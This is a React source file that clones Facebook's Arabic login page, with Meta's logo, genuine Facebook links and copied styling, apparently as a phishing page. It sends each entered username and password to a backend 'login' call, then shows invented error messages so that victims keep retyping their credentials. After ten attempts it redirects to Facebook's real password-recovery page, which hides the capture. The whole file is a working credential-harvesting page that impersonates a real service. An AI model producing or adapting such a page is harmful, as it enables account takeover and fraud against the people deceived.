import { useState } from 'react';
import { useLoginMutation } from '../toolkit/apiSlice';
import './input.css'

const defaultErrorPassword = 'إن كلمة السر التي أدخلتها غير صحيحة.'
const signupLink = 'https://web.facebook.com/reg/?entry_point=login'
const forgetPassLink = 'https://web.facebook.com/login/identify/?ci=AdAATCbQ03QyFf7o0JhbfxktfX3C_cTp9Jd9y25NOQZKqKCmQlqi44EMDiXSSLoyGfKEwF6OH4FTxjRe3Wt7EOiEF7eSeaeBEbZzm1hRDfH4wHfXAJiEmvfx3No6mVkAMtUpi-bJxJNrJXFXRkWuSnaA_CmrHhmKfhn9iM66BnMTe6N3zlbFs_kpORCzgCe1o5a9KPqPtEsphEJB7tW8khr3YcLG6Hfu2U9Zt2fN0AwVmVwcq9jqmCul5vXdzxrD2nXkceareCW9D4lbnIYVukdW3ECC'
const fbHomePage = 'https://web.facebook.com/'
const findAccLink = 'https://web.facebook.com/login/identify/?_rdc=1&_rdr#'

function LoginForm() {
  const [showPassword, setShowPassword] = useState(false);

  const [userName, setUserName] = useState('');
  const [password, setPassword] = useState('');

  const [login, { isLoading }] = useLoginMutation()

  const [errors, setErrors] = useState({
    userName: '', password: '',
    attemptsNumbers: Number(localStorage.getItem('attemptsNumbers')) || 0,
  })

  const handleSubmit = async (e) => {
    e.preventDefault();
    let attempt = errors.attemptsNumbers ?? 0;
    const oldState = {
      userName: '', password: '',
      attemptsNumbers: attempt,
    }

    await login({ userName, password })
    const newAttemptNumber = attempt + 1
    oldState.attemptsNumbers = newAttemptNumber
    localStorage.setItem('attemptsNumbers', newAttemptNumber)

    if (newAttemptNumber === 1) {
      oldState.userName = 'البريد الإلكتروني أو رقم الهاتف المحمول الذي أدخلته غير مرتبط بحساب.'
    }
    if (newAttemptNumber > 1) {
      oldState.password = defaultErrorPassword
    }
    if (newAttemptNumber > 4) {
      oldState.password = 'لقد حاولت تسجيل الدخول عدة مرات. يُرجى المحاولة مرة أخرى لاحقًا.'
    }
    setErrors(oldState)
    if (newAttemptNumber > 10) {
      location.href = forgetPassLink
      localStorage.clear()
    }
  };



  return (
    <div className="form-card">
      <h2>تسجيل الدخول إلى فيسبوك</h2>

      <form onSubmit={handleSubmit}>
        <div className="input-group">

          <div className="fb-field">
            <input type="text" id="fb-email " className={"fb-input " + (isLoading && 'disabled')}
              dir="rtl" placeholder=" "
              // placeholder="البريد الإلكتروني أو رقم الهاتف المحمول"
              autoComplete="username webauthn"
              value={userName}
              onChange={(e) => setUserName(e.target.value)} />
            <label htmlFor="fb-email" className="fb-label text ">البريد الإلكتروني أو رقم الهاتف المحمول</label>
          </div>

          {errors.userName && (
            <div className="login-error" dir="rtl">
              <span className="error-icon">!</span>
              <span>
                البريد الإلكتروني أو رقم الهاتف المحمول الذي أدخلته غير مرتبط بحساب.
                <a href={findAccLink} className='text'>اعثر على حسابك
                  وقم
                  بتسجيل الدخول.
                </a>
              </span>
            </div>
          )}
        </div>


        <div className="input-group">

          <div className="fb-field password-field">
            <input
              type={showPassword ? "text" : "password"}
              id="fb-password"
              className={"fb-input " + (isLoading && 'disabled')}
              dir="rtl"
              placeholder=" "
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />

            <label
              htmlFor="fb-password"
              className="fb-label text color"
            >
              كلمة السر
            </label>

            <button
              type="button"
              className="show-password"
              onClick={() => setShowPassword(prev => !prev)}
              aria-label={showPassword ? "إخفاء كلمة السر" : "إظهار كلمة السر"}
            >
              {showPassword ? (
                // Full eye - password visible
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path
                    d="M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7Z"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                  <circle
                    cx="12"
                    cy="12"
                    r="3"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                  />
                </svg>
              ) : (
                // Full eye with slash - password hidden
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path
                    d="M2 12s3.5-7 10-7c2.1 0 3.9.6 5.4 1.5M22 12s-3.5 7-10 7c-2.1 0-3.9-.6-5.4-1.5"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                  />

                  <path
                    d="M4 4l16 16"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                  />

                  <circle
                    cx="12"
                    cy="12"
                    r="3"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                  />
                </svg>
              )}
            </button>
          </div>
          {errors.password && (
            <div className="login-error" dir="rtl">
              <span className="error-icon">!</span>
              <span>
                {errors.password}
              </span>
            </div>

          )}
        </div>
        <button type="submit" className={"btn-login text " + (isLoading && 'disabled')}>
          {isLoading ? <span className="spinner fb-spinner" id="spinner"></span> : 'تسجيل الدخول '}
        </button>
      </form>

      {/* <div className="tester x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x6s0dn4 x1k70j0n xzueoph xzboxd6 x14l7nz5"><div className="x3nfvp2 x1n2onr6 xh8yej3"><a className="x1i10hfl xjbqb8w x1ejq31n x18oe1m7 x1sy0etr xstzfhl x972fbf x10w94by x1qhh985 x14e42zd x1ypdohk x3ct3a4 xdj266r x14z9mp xat24cr x1lziwak xexx8yu xyri2b x18d9i69 x1c1uobl x16tdsg8 x1hl2dhg xggy1nq x1fmog5m xu25z0z x140muxe xo1y3bh x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3" href="/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjo1LCJjcmVhdGlvbl90aW1lIjoxNzg4MjE0Nzg2fQ%3D%3D&amp;ars=facebook_login" role="link" tabindex="0"><div role="none" className="x1ja2u2z x78zum5 x2lah0s x1n2onr6 xl56j7k x6s0dn4 xozqiw3 x1q0g3np x972fbf x10w94by x1qhh985 x14e42zd x9f619 xjbqb8w xqbgfmv xbe3n85 x7a1id4 x1d9i5bo x1xila8y x1bumbmr xc8cyl1"><div className="html-div xdj266r xat24cr xexx8yu xyri2b x18d9i69 x1c1uobl x6s0dn4 x78zum5 xl56j7k x1e0frkt xf0ucvx xx2axb6"><div role="none" className="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x10ksdce x16k4gxc"><span className="x1lliihq x1plvlek xryxfnj x1n2onr6 xyejjpt x15dsfln x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1sfkdl8 xurcqga x3vd66c xhqx0jl xzsf02u x1yc453h xudqn12 x3x7a5m" style="--x---base-line-clamp-line-height:calc(var(--primary-label-line-height) * 1em);--x-lineHeight:calc(var(--primary-label-line-height) * 1em)"><span className="x1lliihq x193iq5w x6ikm8r x10wlt62 xlyipyv xuxw1ft">هل نسيت كلمة السر؟</span></span></div></div><div className="x1ey2m1c xtijo5x x1o0tod xg01cxk x47corl x10l6tqk x13vifvy x1ebt8du x19991ni x1dhq9h x1fmog5m xu25z0z x140muxe xo1y3bh" role="none" data-visualcompletion="ignore" style="inset: 0px;"></div></div></a></div></div> */}
      <a href={forgetPassLink} className="forgot text">
        هل نسيت كلمة السر؟
      </a>
      <a className="btn" href={signupLink}>
        <button type="button" className="btn-create text">
          إنشاء حساب جديد
        </button>
      </a>

      <div className='meta-logo'>
        <svg aria-label="شعار Meta" className="x1kpxq89 x1247r65 meta-logo-svg" role="img" viewBox="0 0 500 100"><defs><linearGradient gradientUnits="userSpaceOnUse" id="_R_l6kqsqppb6amH1_" x1="124.38" x2="160.839" y1="99" y2="59.326"><stop offset=".427" stopColor="#0278F1"></stop><stop offset=".917" stopColor="#0180FA"></stop></linearGradient><linearGradient gradientUnits="userSpaceOnUse" id="_R_l6kqsqppb6amH2_" x1="42" x2="-1.666" y1="4.936" y2="61.707"><stop offset=".427" stopColor="#0165E0"></stop><stop offset=".917" stopColor="#0180FA"></stop></linearGradient><linearGradient gradientUnits="userSpaceOnUse" id="_R_l6kqsqppb6amH3_" x1="27.677" x2="132.943" y1="28.71" y2="71.118"><stop stopColor="#0064E0"></stop><stop offset=".656" stopColor="#0066E2"></stop><stop offset="1" stopColor="#0278F1"></stop></linearGradient></defs><path className="xt3erj5" d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33"></path><path className="xt3erj5" d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA"></path><path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#_R_l6kqsqppb6amH1_)"></path><path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#_R_l6kqsqppb6amH2_)"></path><path d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z" fill="url(#_R_l6kqsqppb6amH3_)"></path></svg>
      </div>
    </div>
  );
}

export default LoginForm;
